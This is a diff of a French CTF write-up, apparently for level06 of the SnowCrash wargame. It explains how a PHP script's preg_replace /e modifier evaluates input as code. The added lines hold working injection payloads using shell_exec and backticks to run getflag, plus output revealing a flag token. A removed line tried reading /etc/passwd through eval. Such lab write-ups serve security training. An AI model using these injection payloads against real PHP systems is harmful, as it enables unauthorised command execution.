@@ -40,37 +40,42 @@ print $r;
 
 > PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
 
-!!!
-> The e modifier is a deprecated regex modifier which allows you to use PHP code within your regular expression. This means that whatever you parse in will be evaluated as a part of your program.
-------------------
+- Regexp
+  
+    **Pour x(y, z)**
 
-**Pour x(y, z)**
+    1. `(\[x (.*)\])` devient `y("\2")`
+        - ex : `([x coucou])` -> `(y("coucou"))`
+    2. `[` devient `(`
+    3. `]` devient `)`
 
-1. `(\[x (.*)\])` devient `y("\2")`
-    - ex : `([x coucou])` -> `(y("coucou"))`
-2. `[` devient `(`
-3. `]` devient `)`
+    Donc, `[x coucou]` -> `[y("coucou")]`
 
-Donc, `[x coucou]` -> `[y("coucou")]`
+    **Pour y(m)**
 
-**Pour y(m)**
-
-1. `.` devient ` x `
-2. `@` devient ` y`
+    1. `.` devient ` x `
+    2. `@` devient ` y`
    
-Par exemple
-    `[x .+@]` -> ` x + y`
-   
------
+- le `/e` :  
+    > The e modifier is a deprecated regex modifier which allows you to use PHP code within your regular expression. This means that whatever you parse in will be evaluated as a part of your program.
+
+- Trouver comment exécuter getflag en passer la bonne syntaxe en paramètre : 
+  
+`echo "[x {\${shell_exec(getflag)}}]" > /tmp/test06 && ./level06 /tmp/test06`
 
 ```
-echo "[x eval("cat /etc/passwd");]" > /tmp/test06
-./level06 /tmp/test06
+echo '[x ${`getflag`}]' > /tmp/getflag`
 ```
-> eval(cat /etc/passwd);
+
+```
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+```
 
 ## Ressources
 
 - php beautifier
 - regexp
 - https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
+- https://www.it-connect.fr/executer-des-commandes-shell-par-un-script-php/
